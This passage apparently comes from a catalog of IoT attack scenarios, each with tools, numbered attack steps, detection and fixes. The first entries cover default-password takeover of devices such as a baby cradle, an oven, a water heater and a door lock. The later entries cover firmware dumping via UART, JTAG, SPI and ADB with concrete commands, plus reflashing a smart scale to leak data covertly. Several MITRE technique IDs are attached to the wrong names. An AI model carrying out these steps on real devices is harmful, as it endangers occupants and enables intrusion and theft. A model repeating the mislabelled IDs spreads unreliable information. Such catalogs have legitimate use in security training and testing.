- **Scenario**: A smart building intercom system lets people call residents. The control panel is accessed using a default password.
- **Attack Steps**: Step 1: Connect your laptop to the same building network (e.g., public lobby Wi-Fi).Step 2: Open browser and visit known intercom panel IP (e.g., 192.168.1.50).Step 3: Enter factory credentials (e.g., admin/admin).Step 4: If successful, you can see a list of apartments and call any unit.Step 5: Simulate calling random units and logging the audio alert.Step 6: Explain how an attacker could use this for harassment.
- **Detection**: Alert on unknown panel access
- **Solution**: Force password reset before usage
- **Tags**: intercom, access control, harassment

## Smart Washing Machine Access with Default Password

- **Attack Type**: Default Credentials Exploitation
- **Target**: Smart Washing Machine
- **Vulnerability**: Bluetooth control with default PIN
- **MITRE**: T0810
- **Impact**: Disruption of daily chores
- **Tools**: Smartphone, App, Default PIN List
- **Scenario**: A connected washing machine lets users start/stop it from a phone app. If the password isn’t changed, anyone nearby can control it.
- **Attack Steps**: Step 1: Stand near the washing machine and scan for Bluetooth devices using the mobile app.Step 2: Connect using a default PIN like 0000 or 1234.Step 3: Open the app and simulate selecting a wash mode.Step 4: Start the machine remotely.Step 5: Repeat this to simulate multiple attacks (e.g., draining water mid-wash).Step 6: Log actions and explain how attackers can cause laundry issues.
- **Detection**: Monitor repeated remote activations
- **Solution**: Ask users to set new Bluetooth PIN
- **Tags**: laundry, Bluetooth, default pin

## Hijacking a Smart Refrigerator Using Default Web Password

- **Attack Type**: Default Credentials Exploitation
- **Target**: Smart Fridge
- **Vulnerability**: Web interface with factory login
- **MITRE**: T0810
- **Impact**: Food spoilage, energy waste
- **Tools**: Laptop, Browser, Router Interface, Default Login List
- **Scenario**: A smart fridge with a web page lets users check stock levels and change settings. Using default credentials, this can be accessed by anyone.
- **Attack Steps**: Step 1: Log into your home router and find the smart fridge’s IP address.Step 2: Open that IP in a web browser.Step 3: Enter login like admin/fridge123 (from public lists).Step 4: Access the panel and simulate increasing freezer temp or disabling cooling.Step 5: Show how this can spoil food or waste electricity.Step 6: Document changes and reset settings.
- **Detection**: Fridge logs or temp alerts
- **Solution**: Require password update after install
- **Tags**: fridge, smart kitchen, temp control

## Unauthorized Access to Smart Curtain Rails

- **Attack Type**: Default Credentials Exploitation
- **Target**: Smart Curtain
- **Vulnerability**: Web panel with unchanged login
- **MITRE**: T0810
- **Impact**: Privacy intrusion, light disruption
- **Tools**: Smartphone, Fing App, Default Login List
- **Scenario**: Smart curtains open or close using an app. If no password is changed, an attacker can control it while inside Wi-Fi range.
- **Attack Steps**: Step 1: Use Fing to find the curtain’s device on the network.Step 2: Visit its control page via a browser.Step 3: Try login like admin/admin.Step 4: Once logged in, simulate opening/closing the curtain remotely.Step 5: Show how this can invade someone's privacy or disturb sleep.Step 6: Exit and reset curtain controls.
- **Detection**: Monitor open/close logs
- **Solution**: Set strong password at setup
- **Tags**: curtain, privacy, window control

## Baby Cradle Rocking Control Hijacked

- **Attack Type**: Default Credentials Exploitation
- **Target**: Smart Cradle
- **Vulnerability**: App access with unchanged credentials
- **MITRE**: T0810
- **Impact**: Infant safety concerns
- **Tools**: Mobile App, Wi-Fi Analyzer, Credential DB
- **Scenario**: Smart cradle rocks automatically using app controls. Attackers can trigger rocking motion using default credentials.
- **Attack Steps**: Step 1: Use Wi-Fi analyzer to identify the cradle’s hotspot.Step 2: Connect to it using default Wi-Fi password (e.g., baby1234).Step 3: Open app and login with default admin credentials.Step 4: Simulate starting/stopping cradle rocking motion.Step 5: Demonstrate timing attacks (e.g., at odd hours).Step 6: Explain safety and sleep risks for infants.
- **Detection**: Detect multiple remote control triggers
- **Solution**: Change default Wi-Fi and app login
- **Tags**: baby cradle, rocking, parenting IoT

## Smart Microwave Exploitation via Mobile App

- **Attack Type**: Default Credentials Exploitation
- **Target**: Smart Microwave
- **Vulnerability**: Bluetooth access with default PIN
- **MITRE**: T0810
- **Impact**: Fire risk, heating abuse
- **Tools**: Smartphone, Microwave App, Default PIN
- **Scenario**: Microwave can be started from an app. If password isn’t changed, attackers nearby can trigger heating remotely.
- **Attack Steps**: Step 1: Download vendor app and scan for microwave via Bluetooth.Step 2: Pair using default PIN (e.g., 0000).Step 3: Open control dashboard and simulate starting the microwave.Step 4: Set timer for 5 minutes to simulate an unsafe operation.Step 5: Stop after demo and explain how an attacker could cause overheating.Step 6: Educate on resetting pairing credentials.
- **Detection**: Alert on unusual remote usage
- **Solution**: Ask user to create custom PIN
- **Tags**: microwave, smart kitchen, heating

## Accessing Smart Aquarium Lights via Factory Settings

- **Attack Type**: Default Credentials Exploitation
- **Target**: Aquarium Light Controller
- **Vulnerability**: Local network panel with default login
- **MITRE**: T0810
- **Impact**: Aquatic harm, environment abuse
- **Tools**: Browser, Fing, Default Credentials Sheet
- **Scenario**: Aquarium lights connected to Wi-Fi allow web-based control. Without changing password, anyone on network can manipulate the lights.
- **Attack Steps**: Step 1: Use Fing to find aquarium light on local network.Step 2: Enter the IP in browser.Step 3: Try login like admin/aqua123.Step 4: Access the light schedule and change color/brightness.Step 5: Simulate setting light to strobe or nighttime mode.Step 6: Explain how this can stress aquatic life.
- **Detection**: Review light schedule history
- **Solution**: Update password and firmware
- **Tags**: aquarium, light control, pet IoT

## Air Quality Sensor Reporting Abuse

- **Attack Type**: Default Credentials Exploitation
- **Target**: Air Quality Monitor
- **Vulnerability**: Internet dashboard with default login
- **MITRE**: T0810
- **Impact**: Health panic, false data reporting
- **Tools**: Browser, Shodan, Default Login DB
- **Scenario**: An indoor air quality monitor shares readings online. Default logins allow attackers to fake pollution levels.
- **Attack Steps**: Step 1: Use Shodan to find exposed AQ sensor dashboards.Step 2: Login using default admin/admin credentials.Step 3: Modify sensor thresholds or inject false PM2.5 data.Step 4: Simulate pollution spike in report export.Step 5: Show how this affects ventilation decisions or health responses.Step 6: Logout and reset changes.
- **Detection**: Review exported reports for odd values
- **Solution**: Lock admin login after install
- **Tags**: air quality, health, sensor spoof

## Smart Coffee Brewer Exploitation via App

- **Attack Type**: Default Credentials Exploitation
- **Target**: Smart Coffee Maker
- **Vulnerability**: Mobile app with unchanged login
- **MITRE**: T0810
- **Impact**: Waste of resources, nuisance
- **Tools**: App, Default Credentials List, Fing
- **Scenario**: A smart coffee machine allows app-based control. Using default login, attackers can start coffee brewing without permission.
- **Attack Steps**: Step 1: Find device on network using Fing.Step 2: Open mobile app and connect to machine.Step 3: Login with default (admin/coffee123).Step 4: Simulate starting brewing at an unusual hour.Step 5: Show how this wastes coffee, water, and power.Step 6: Recommend locking app access via password.
- **Detection**: Coffee usage logs
- **Solution**: Enforce login during pairing
- **Tags**: coffee, app control, brewing

## Unauthorized Control of Smart Water Heater

- **Attack Type**: Default Credentials Exploitation
- **Target**: Smart Water Heater
- **Vulnerability**: Admin page with unchanged factory credentials
- **MITRE**: T1078
- **Impact**: Burn hazard, energy waste
- **Tools**: Fing App, Browser, Vendor App, Default Credentials List
- **Scenario**: A smart water heater allows remote control through a mobile app and web interface. If the default credentials are not changed, an attacker can adjust the temperature and timer.
- **Attack Steps**: Step 1: Use the Fing app on your phone to find the IP address of the water heater.Step 2: Open a browser and enter the IP (e.g., http://192.168.1.60) to access the heater’s admin panel.Step 3: Try default credentials like admin/heater123 or admin/admin.Step 4: If successful, navigate to the temperature control section.Step 5: Simulate increasing the temperature to the maximum level (e.g., 75°C), or change scheduled timings.Step 6: Discuss the danger of burns or energy waste caused by unauthorized access.Step 7: Reset all settings and emphasize the importance of strong passwords.
- **Detection**: Monitor temperature logs and remote access timestamps
- **Solution**: Enforce password change upon first use
- **Tags**: smart heater, hot water, home IoT

## Smart Vacuum Hijack via Default App Login

- **Attack Type**: Default Credentials Exploitation
- **Target**: Smart Vacuum Robot
- **Vulnerability**: Mobile app login with default credentials
- **MITRE**: T0810
- **Impact**: Disturbance, potential reconnaissance
- **Tools**: Mobile App, Wi-Fi Analyzer, Default Password DB
- **Scenario**: A robotic vacuum cleaner can be remotely controlled through a mobile app. If the app’s login uses factory credentials, anyone who connects to the same Wi-Fi can operate it.
- **Attack Steps**: Step 1: Connect to the same Wi-Fi as the vacuum.Step 2: Open the vacuum’s app on a smartphone.Step 3: Use known default credentials like user/user or admin/robot123.Step 4: Control the vacuum by starting it, stopping it, or sending it to random rooms.Step 5: Simulate this repeatedly to show how it can disturb sleep or break things.Step 6: Explain risks like mapping the house layout for future intrusions.Step 7: Recommend setting up secure, unique user accounts for the app.
- **Detection**: Monitor unusual room coverage patterns
- **Solution**: Enforce app password creation
- **Tags**: vacuum, mapping, robot hijack

## Controlling Smart Oven Through Default Password

- **Attack Type**: Default Credentials Exploitation
- **Target**: Smart Oven
- **Vulnerability**: Web interface with factory password
- **MITRE**: T0810
- **Impact**: Fire hazard, overcooking, electricity misuse
- **Tools**: Web Browser, Fing App, Vendor Default Login List
- **Scenario**: A smart oven lets users set timers and cooking temperatures from a web interface. If the default login is not changed, attackers can remotely operate it.
- **Attack Steps**: Step 1: Identify the smart oven on the network using Fing.Step 2: Visit its control interface via browser (e.g., http://192.168.0.75).Step 3: Enter default login (e.g., admin/oven123).Step 4: Access cooking settings and simulate turning on preheat at 250°C.Step 5: Set an unnecessary timer to simulate misuse.Step 6: Explain how this could waste electricity, pose a fire risk, or ruin food.Step 7: Emphasize importance of changing default credentials and using app lock.
- **Detection**: Monitor cooking sessions and temp thresholds
- **Solution**: Password change enforcement on first use
- **Tags**: oven, fire risk, kitchen automation

## Smart Light System Access Using Factory Credentials

- **Attack Type**: Default Credentials Exploitation
- **Target**: Smart Light Hub
- **Vulnerability**: Local web dashboard with unchanged login
- **MITRE**: T0810
- **Impact**: Visual harassment, loss of control
- **Tools**: Browser, IP Scanner, Default Credentials Sheet
- **Scenario**: A smart lighting system that controls all room lights via Wi-Fi can be operated by anyone who accesses the default login credentials.
- **Attack Steps**: Step 1: Use an IP scanner tool to find the IP address of the lighting hub.Step 2: Visit the IP in your browser.Step 3: Try default credentials like admin/light123.Step 4: If successful, simulate turning off lights in multiple rooms, changing light colors, or flashing them repeatedly.Step 5: Demonstrate how this could cause panic or interfere with routines.Step 6: Log events and show how attackers could use it for harassment.Step 7: Secure the system with a strong, new password.
- **Detection**: Detect excessive on/off patterns
- **Solution**: Setup unique credentials, 2FA optional
- **Tags**: lighting, smart home, color control

## Default Credential Attack on Smart Lock Control Panel

- **Attack Type**: Default Credentials Exploitation
- **Target**: Smart Door Lock
- **Vulnerability**: Web admin page with factory default login
- **MITRE**: T1078
- **Impact**: Unauthorized entry, burglary
- **Tools**: Browser, Router Admin Page, Default Password List
- **Scenario**: A smart door lock has a browser-accessible admin panel that uses a default password, allowing unauthorized unlocking of doors.
- **Attack Steps**: Step 1: Access the router’s admin panel to find the lock’s IP.Step 2: Open the IP in a browser (e.g., http://192.168.1.80).Step 3: Try default credentials (e.g., admin/lock123).Step 4: Once inside the dashboard, simulate unlocking the door or disabling the auto-lock feature.Step 5: Explain how this can result in unauthorized physical entry.Step 6: Stress that locks should be the most secure devices in the home.Step 7: Recommend using a strong passphrase and enabling 2FA if available.
- **Detection**: Audit door unlock logs & IPs
- **Solution**: Require strong password at install
- **Tags**: door lock, security, physical access

## Extracting Firmware via UART from Smart Camera

- **Attack Type**: Firmware Extraction & Analysis
- **Target**: Smart Camera
- **Vulnerability**: Exposed debug interface
- **MITRE**: T1040 - Serial Connection Enumeration
- **Impact**: Exposed credentials, system files
- **Tools**: UART Cable, Logic Analyzer (Saleae), minicom, binwalk
- **Scenario**: A hacker targets a smart IP camera by connecting to its UART interface and dumps the firmware for reverse engineering.
- **Attack Steps**: Step 1: Open the camera casing and locate UART pins (usually labeled TX, RX, GND). Step 2: Use a multimeter or datasheet to confirm voltage levels and pinouts. Step 3: Connect UART cable (TX to RX, RX to TX, GND to GND) to a USB-to-Serial adapter. Step 4: Open minicom or PuTTY at common baud rates (e.g., 115200) to access the bootloader/console. Step 5: Power on the device; capture boot logs and interrupt boot process if possible. Step 6: Use console commands to dump firmware to serial or USB if shell access is granted. Step 7: Analyze dumped image with binwalk to extract file systems.
- **Detection**: Monitor UART usage on physical access
- **Solution**: Disable UART access, epoxy over debug pins
- **Tags**: firmware, UART, serial, reverse engineering

## Firmware Dump via JTAG on IoT Smart Lock

- **Attack Type**: Firmware Extraction & Analysis
- **Target**: Smart Lock
- **Vulnerability**: Exposed JTAG port
- **MITRE**: T1040, T1602
- **Impact**: Access to encrypted keys, bypass auth
- **Tools**: JTAGulator, OpenOCD, FT2232H, binwalk, Ghidra
- **Scenario**: An attacker accesses firmware through JTAG interface on a smart lock for vulnerability analysis.
- **Attack Steps**: Step 1: Open device casing and visually inspect PCB for JTAG pinouts (TCK, TMS, TDI, TDO, GND). Step 2: Use JTAGulator to identify pinout and confirm interface. Step 3: Connect FT2232H or J-Link debugger to JTAG pins. Step 4: Use OpenOCD to connect and read device memory using the dump_image command. Step 5: Save and analyze firmware using binwalk and Ghidra to inspect for hardcoded keys, passwords. Step 6: Reconstruct file system and simulate vulnerabilities.
- **Detection**: Hardware interface monitoring, JTAG activity logs
- **Solution**: Disable JTAG post-manufacturing, use epoxy
- **Tags**: jtag, firmware, reverse engineering

## OTA Firmware Capture & Reverse Engineering

- **Attack Type**: Firmware Extraction & Analysis
- **Target**: Smart Plug
- **Vulnerability**: Insecure firmware update
- **MITRE**: T1557.003 - Network Sniffing
- **Impact**: Firmware manipulation, logic bypass
- **Tools**: Wireshark, mitmproxy, binwalk, Ghidra
- **Scenario**: An attacker captures Over-the-Air (OTA) firmware update of a smart plug and reverse engineers it.
- **Attack Steps**: Step 1: Set up a Wi-Fi access point using hostapd and route traffic via mitmproxy. Step 2: Connect the smart plug to this network and trigger firmware update via mobile app. Step 3: Capture all HTTP/HTTPS traffic and look for .bin or .img files being downloaded. Step 4: Save captured firmware and analyze with binwalk to extract file systems. Step 5: Use Ghidra to reverse engineer binary for hardcoded credentials or logic flaws. Step 6: Identify update protocol used (e.g., no signature check).
- **Detection**: Monitor OTA traffic, endpoint monitoring
- **Solution**: Encrypt/sign OTA, use secure update mechanism
- **Tags**: ota, mitm, sniffing, reverse engineering

## Extracting Firmware from Flash Chip (SPI)

- **Attack Type**: Firmware Extraction & Analysis
- **Target**: Router / Gateway
- **Vulnerability**: Physical access to SPI flash
- **MITRE**: T1602.002 - Firmware Extraction
- **Impact**: Full firmware dump, reverse engineering
- **Tools**: SOIC clip, CH341A programmer, flashrom, binwalk, Ghidra
- **Scenario**: Hacker removes flash chip from a router and extracts firmware for reverse engineering.
- **Attack Steps**: Step 1: Open device casing and identify SPI flash chip (e.g., Winbond). Step 2: Clip SOIC-8 clamp onto chip without desoldering, connect to CH341A USB programmer. Step 3: Use flashrom to read chip contents (flashrom -p ch341a_spi -r dump.bin). Step 4: Use binwalk to analyze file system and extract files. Step 5: Use Ghidra to examine firmware logic and backdoor presence.
- **Detection**: Flash chip read detection (if supported)
- **Solution**: Epoxy on chips, encryption of firmware
- **Tags**: spi, flashrom, hardware

## Firmware Recovery from Firmware Update File

- **Attack Type**: Firmware Extraction & Analysis
- **Target**: Generic IoT Device
- **Vulnerability**: Unprotected firmware archive
- **MITRE**: T1602 - Firmware Dumping
- **Impact**: Vulnerability discovery in public firmware
- **Tools**: Binwalk, Firmware Mod Kit (FMK), Ghidra, strings
- **Scenario**: A firmware update file (.img) from a vendor’s website is downloaded and reverse engineered.
- **Attack Steps**: Step 1: Download firmware image file from vendor support site. Step 2: Use binwalk to analyze the structure and extract partitions. Step 3: Load extracted root file system into Firmware Mod Kit to make it editable. Step 4: Use strings command to search for hardcoded passwords or URLs. Step 5: Analyze binaries using Ghidra to find vulnerabilities or logic flaws. Step 6: Modify files for testing in virtual environment (optional).
- **Detection**: Monitor file downloads & endpoint behavior
- **Solution**: Obfuscate firmware, enforce encryption
- **Tags**: binwalk, ghidra, firmware mod kit

## Full Firmware Dump from Smart Thermostat Using SPI Flash Removal

- **Attack Type**: Firmware Extraction & Analysis
- **Target**: Smart Thermostat
- **Vulnerability**: Physical flash chip access
- **MITRE**: T1602.002
- **Impact**: Full firmware control, rootkit insertion
- **Tools**: Hot Air Rework Station, CH341A, Flashrom, Binwalk, Ghidra
- **Scenario**: Attacker physically removes flash chip from a smart thermostat to extract its firmware for modification.
- **Attack Steps**: Step 1: Power off the thermostat and unscrew casing. Step 2: Use magnifying lens to locate SPI flash chip (e.g., Winbond W25Q64). Step 3: Use hot air rework station to desolder the chip. Step 4: Insert the chip into a CH341A programmer. Step 5: Use flashrom to read firmware (flashrom -p ch341a_spi -r dump.bin). Step 6: Analyze dump.bin using binwalk to extract embedded file systems. Step 7: Use Ghidra to reverse engineer critical binaries.
- **Detection**: Visual inspection of hardware tampering
- **Solution**: Use encrypted storage, potting over chips
- **Tags**: spi, hardware, dump

## Firmware Analysis of Router Using Factory Recovery Image

- **Attack Type**: Firmware Extraction & Analysis
- **Target**: Router
- **Vulnerability**: Public access to firmware
- **MITRE**: T1602
- **Impact**: Local privilege escalation, credential leaks
- **Tools**: Binwalk, FMK, Ghidra, Strings
- **Scenario**: Researcher downloads and analyzes a router’s recovery image available on its vendor’s support site.
- **Attack Steps**: Step 1: Visit router support site and download recovery firmware .img. Step 2: Use binwalk to identify compressed filesystems inside the image. Step 3: Extract the filesystem with binwalk -e firmware.img. Step 4: Use Firmware Mod Kit to mount and modify the image. Step 5: Explore /etc/shadow and /etc/passwd for hardcoded credentials. Step 6: Analyze services and binaries in /bin, /sbin using Ghidra. Step 7: Create a simulation of vulnerable firmware in sandboxed VM.
- **Detection**: Monitor abnormal firmware downloads
- **Solution**: Sign and encrypt firmware updates
- **Tags**: firmware, router, mod kit

## Vulnerability Discovery in Wearable via UART Dump

- **Attack Type**: Firmware Extraction & Analysis
- **Target**: Wearable Device
- **Vulnerability**: Accessible debug UART
- **MITRE**: T1040, T1602.001
- **Impact**: Access to pairing logic, user data
- **Tools**: UART to USB Adapter, Minicom, Binwalk, Ghidra
- **Scenario**: Hacker accesses wearable device debug port via UART to extract bootloader and filesystem.
- **Attack Steps**: Step 1: Open smartwatch casing with plastic tools. Step 2: Identify UART pads using multimeter and test them using a USB-to-UART adapter. Step 3: Use minicom at common baud rates to observe boot logs. Step 4: Interrupt bootloader using serial command (like Ctrl+C or ESC). Step 5: Use bootloader commands like dump, readmem, or dd to extract firmware. Step 6: Save memory dump and analyze it using binwalk and Ghidra. Step 7: Document insecure logic like insecure Bluetooth pairing logic in binaries.
- **Detection**: Monitor serial port tampering
- **Solution**: Disable UART at release stage
- **Tags**: uart, wearable, serial

## Reverse Engineering a Smart Light Bulb via Flash Dump

- **Attack Type**: Firmware Extraction & Analysis
- **Target**: Smart Bulb
- **Vulnerability**: Unprotected Flash Memory
- **MITRE**: T1602
- **Impact**: Leaked Wi-Fi & Cloud credentials
- **Tools**: SOIC8 Clip, CH341A, Flashrom, Binwalk, Ghidra
- **Scenario**: A security researcher dumps and analyzes firmware from a smart bulb to evaluate security flaws.
- **Attack Steps**: Step 1: Identify the flash chip on the PCB (often 8-pin SOIC type). Step 2: Clip SOIC8 probe to the flash chip while it's unpowered. Step 3: Connect probe to CH341A programmer and dump using flashrom. Step 4: Analyze dump with binwalk to extract filesystem and partition layout. Step 5: Look for plaintext configuration files with Wi-Fi credentials or MQTT keys. Step 6: Use Ghidra to examine bootloader and firmware update logic.
- **Detection**: Monitor Wi-Fi activity post-reset
- **Solution**: Encrypt local config, disable debug ports
- **Tags**: smartlight, flash, reverse

## Capturing In-Transit Firmware via Local Network Proxy

- **Attack Type**: Firmware Extraction & Analysis
- **Target**: IP Camera
- **Vulnerability**: Insecure transmission of firmware
- **MITRE**: T1557.003
- **Impact**: MITM attack, firmware hijacking
- **Tools**: Wireshark, mitmproxy, Burp Suite, Binwalk
- **Scenario**: Attacker uses a proxy to intercept unencrypted firmware pushed to device during setup.
- **Attack Steps**: Step 1: Set up Wi-Fi AP using laptop and hostapd. Step 2: Configure mitmproxy or Burp Suite to capture HTTP/S traffic. Step 3: Connect IoT device (e.g., IP camera) to this rogue AP. Step 4: Use vendor app to trigger update; capture .bin firmware file. Step 5: Analyze captured firmware using binwalk, looking for plaintext passwords or update routines. Step 6: Simulate test environment to run vulnerable firmware in emulated sandbox.
- **Detection**: Monitor update traffic & TLS certs
- **Solution**: Enforce TLS with certificate pinning
- **Tags**: mitm, sniff, firmware

## Dumping Firmware from Exploited Web Interface

- **Attack Type**: Firmware Extraction & Analysis
- **Target**: Smart Appliance
- **Vulnerability**: Web Interface File Disclosure
- **MITRE**: T1210
- **Impact**: Firmware exfiltration via browser
- **Tools**: Burp Suite, Browser, Binwalk, Ghidra
- **Scenario**: An IoT web panel running as root allows direct firmware download using a web path traversal vulnerability.
- **Attack Steps**: Step 1: Connect to device's web admin panel. Step 2: Use path traversal in firmware path (e.g., GET /../firmware.img). Step 3: Intercept and modify requests using Burp Suite to gain firmware dump. Step 4: Save firmware image and analyze using binwalk. Step 5: Reverse engineer binaries using Ghidra to identify command injection or insecure auth logic.
- **Detection**: Monitor web requests for anomalies
- **Solution**: Validate file access, sanitize input paths
- **Tags**: path traversal, web, panel

## Dumping eMMC NAND Firmware via Test Pads

- **Attack Type**: Firmware Extraction & Analysis
- **Target**: Industrial IoT Device
- **Vulnerability**: Unprotected eMMC
- **MITRE**: T1602.002
- **Impact**: Full disk access, kernel analysis
- **Tools**: Logic Analyzer, eMMC Reader, eMMCDump, Binwalk
- **Scenario**: Attacker reads firmware directly from eMMC chip via exposed test pads on device PCB.
- **Attack Steps**: Step 1: Locate eMMC test pads labeled CLK, CMD, DAT0 on PCB using multimeter and datasheet. Step 2: Solder thin wires from pads to an eMMC reader or SD breakout. Step 3: Use eMMCDump to read user partition. Step 4: Extract partitioned filesystem using binwalk. Step 5: Reverse engineer critical binaries using Ghidra.
- **Detection**: Physical tamper detection on pads
- **Solution**: Use encrypted storage, pad obfuscation
- **Tags**: emmc, nand, reader

## Dumping Firmware via U-Boot Over TFTP

- **Attack Type**: Firmware Extraction & Analysis
- **Target**: Embedded Device
- **Vulnerability**: Unsecured bootloader + TFTP
- **MITRE**: T1040, T1602
- **Impact**: Bootloader abuse for firmware dump
- **Tools**: UART Cable, TFTP Server, Minicom, Binwalk
- **Scenario**: Researcher accesses U-Boot via serial and dumps firmware using TFTP bootloader commands.
- **Attack Steps**: Step 1: Connect to UART console on device and access U-Boot. Step 2: Set up local TFTP server on PC. Step 3: Use U-Boot command: tftpboot 0x80000000 firmware.bin to upload. Step 4: Use save or cp command in U-Boot to write firmware back to PC. Step 5: Analyze firmware using binwalk for configuration files.
- **Detection**: Monitor UART & TFTP port activity
- **Solution**: Lock bootloader & use signed images
- **Tags**: tftp, uboot, firmware

## Reversing Public Firmware from GitHub Release

- **Attack Type**: Firmware Extraction & Analysis
- **Target**: Smart Switch
- **Vulnerability**: Public open firmware
- **MITRE**: T1602
- **Impact**: Pre-disclosure vulnerability patching
- **Tools**: Binwalk, Firmware-Mod-Kit, Ghidra
- **Scenario**: Researcher downloads .bin release from open-source smart home project and reverse engineers.
- **Attack Steps**: Step 1: Download .bin release from GitHub of target smart switch project. Step 2: Analyze with binwalk and extract filesystem. Step 3: Mount extracted filesystem using loop device. Step 4: Explore startup scripts, network configurations, and update logic. Step 5: Use Ghidra to inspect core binaries for buffer overflows.
- **Detection**: GitHub monitoring by attacker
- **Solution**: Harden release process, remove debug
- **Tags**: github, open source, firmware

## Analysis of File System in Dumped Firmware

- **Attack Type**: Firmware Extraction & Analysis
- **Target**: Smart Speaker
- **Vulnerability**: Poor file system hardening
- **MITRE**: T1602.001
- **Impact**: Credential exposure, cloud abuse
- **Tools**: Binwalk, QEMU, Ghidra, chroot
- **Scenario**: After dumping firmware from a smart speaker, analyst explores the filesystem for misconfigurations.
- **Attack Steps**: Step 1: Use binwalk to extract file system from firmware.bin. Step 2: Mount the extracted file system with chroot or emulate with QEMU. Step 3: Browse /etc/ folder for misconfigurations (e.g., weak SSH keys). Step 4: Use Ghidra to reverse engineer voice processing binaries. Step 5: Test hardcoded cloud connection logic in controlled sandbox.
- **Detection**: Anomalous cloud API use
- **Solution**: Sanitize filesystem, avoid secrets in code
- **Tags**: fs analysis, qemu, reverse

## Dumping Firmware Using ISP (In-System Programming) Header

- **Attack Type**: Firmware Extraction & Analysis
- **Target**: Smart Meter
- **Vulnerability**: Exposed ISP port
- **MITRE**: T1602.002
- **Impact**: Full code dump via ISP
- **Tools**: USBasp Programmer, AVRDude, Binwalk, Ghidra
- **Scenario**: Attacker uses ISP header pins to extract flash content from a smart meter without removing the chip.
- **Attack Steps**: Step 1: Open the smart meter casing to expose PCB. Step 2: Locate 6-pin or 10-pin ISP header on the board. Step 3: Connect USBasp to ISP header pins. Step 4: Use avrdude -c usbasp -p m328p -U flash:r:firmware.hex:i to read firmware. Step 5: Convert .hex to .bin if needed. Step 6: Use binwalk to extract contents and Ghidra to analyze binaries.
- **Detection**: Monitor access to ISP header
- **Solution**: Disable or remove ISP header in production
- **Tags**: isp, avr, programmer

## Firmware Modification and Re-Flashing on Smart Scale

- **Attack Type**: Firmware Extraction & Analysis
- **Target**: Smart Scale
- **Vulnerability**: Writable flash + logic flaw
- **MITRE**: T1601.001, T1602
- **Impact**: Covert data exfiltration
- **Tools**: Binwalk, Ghidra, SPI Flasher (CH341A), Flashrom
- **Scenario**: Attacker extracts and modifies firmware, then reflashes it back to inject malicious behavior.
- **Attack Steps**: Step 1: Use SOIC8 clip and flashrom to dump original firmware. Step 2: Analyze firmware structure with binwalk. Step 3: Use Ghidra to identify key logic controlling Bluetooth data. Step 4: Modify data transmission routine to leak data to attacker-controlled app. Step 5: Save modified firmware and re-flash via flashrom -w firmware_mod.bin. Step 6: Power on device and verify altered behavior in controlled setup.
- **Detection**: Firmware hash mismatch (if implemented)
- **Solution**: Implement code signing and integrity check
- **Tags**: firmware mod, reflashing

## Extracting Firmware from Unencrypted SD Card in IoT Device

- **Attack Type**: Firmware Extraction & Analysis
- **Target**: Surveillance Device
- **Vulnerability**: Unprotected SD card
- **MITRE**: T1602
- **Impact**: Credential and config leakage
- **Tools**: SD Card Reader, Binwalk, Ghidra, Strings
- **Scenario**: Researcher retrieves firmware stored on unprotected SD card used in a surveillance device.
- **Attack Steps**: Step 1: Power off the device and remove SD card. Step 2: Insert into SD card reader on PC. Step 3: Copy entire content (dd if=/dev/sdX of=dump.img). Step 4: Run binwalk -e dump.img to extract firmware files. Step 5: Explore /etc, /bin for configurations and services. Step 6: Use Ghidra and strings to analyze binaries and search for IPs, keys.
- **Detection**: Endpoint monitoring, removable storage alerts
- **Solution**: Encrypt SD data or bind with device serial
- **Tags**: sdcard, physical access, analysis

## Firmware Extraction from Android-Based IoT Device Using ADB

- **Attack Type**: Firmware Extraction & Analysis
- **Target**: Android-based IoT
- **Vulnerability**: Unsecured ADB access
- **MITRE**: T1059.004, T1602
- **Impact**: Full firmware dump, system compromise
- **Tools**: ADB Tools, Binwalk, Ghidra
- **Scenario**: Hacker gains firmware dump by exploiting open Android Debug Bridge (ADB) port on IoT device.
- **Attack Steps**: Step 1: Discover device on network with adb devices. Step 2: Connect using adb shell if no password required. Step 3: Use dd if=/dev/block/mtdblock0 of=/sdcard/dump.img. Step 4: Pull image to local system using adb pull /sdcard/dump.img. Step 5: Analyze image with binwalk to extract partitions. Step 6: Reverse engineer with Ghidra and test emulation.
- **Detection**: Monitor ADB ports and logs
- **Solution**: Disable ADB on production devices
- **Tags**: adb, android, firmware

## Recovery Console Exploit for Firmware Access

- **Attack Type**: Firmware Extraction & Analysis
- **Target**: Smart Hub
- **Vulnerability**: Weak recovery access
- **MITRE**: T1548.003, T1602
- **Impact**: Root access, firmware control
- **Tools**: UART Cable, Minicom, Binwalk, dd
- **Scenario**: User triggers a recovery mode in a smart hub via button combo to access root console and dump firmware.
- **Attack Steps**: Step 1: Hold specific buttons (e.g., power + reset) while powering device to trigger recovery. Step 2: Connect via UART and access root console (login: root). Step 3: Use dd if=/dev/mtd0 of=/tmp/dump.img to create dump. Step 4: Transfer via TFTP, SCP, or UART to local machine. Step 5: Use binwalk to extract image. Step 6: Analyze for insecure logic or embedded credentials.
- **Detection**: Firmware hash mismatch or serial logs
- **Solution**: Lock recovery, require keys or signed code
- **Tags**: recovery mode, uart, debug

## Extraction of Firmware via SPI Tap (On-The-Fly)

- **Attack Type**: Firmware Extraction & Analysis
- **Target**: Smart Appliance
- **Vulnerability**: Exposed SPI bus
- **MITRE**: T1602.002
- **Impact**: Passive firmware acquisition
- **Tools**: Logic Analyzer (Saleae), SPI Tap Adapter, PulseView, Binwalk
- **Scenario**: Attacker uses logic analyzer to passively tap SPI communication during power-on to extract firmware live.
- **Attack Steps**: Step 1: Attach SPI tap probes to MOSI, MISO, CLK, and GND on flash chip. Step 2: Use PulseView or sigrok to record traffic during boot-up. Step 3: Extract binary data from recorded SPI stream. Step 4: Save as .bin and analyze using binwalk. Step 5: Identify init scripts or kernel params for reverse engineering.
- **Detection**: SPI pattern logging, boot hash change
- **Solution**: Shield SPI traces, use encrypted flash
- **Tags**: spi tap, passive, sniffing

## Firmware Dump from Encrypted Firmware via Key Extraction

- **Attack Type**: Firmware Extraction & Analysis
- **Target**: Secure IoT Device
- **Vulnerability**: RAM-based key exposure
- **MITRE**: T1003.004, T1602
- **Impact**: Bypass firmware encryption
- **Tools**: JTAG, GDB, Binwalk, Ghidra
- **Scenario**: Analyst dumps encrypted firmware and extracts keys from RAM during runtime.
- **Attack Steps**: Step 1: Attach JTAG to running device and pause execution with GDB. Step 2: Dump RAM and locate decryption key in memory heap. Step 3: Use dumped key to decrypt stored firmware from flash. Step 4: Extract decrypted firmware image. Step 5: Analyze it with binwalk, reverse binaries in Ghidra.
- **Detection**: Memory integrity checking
- **Solution**: Use hardware-backed key storage
- **Tags**: encrypted firmware, key

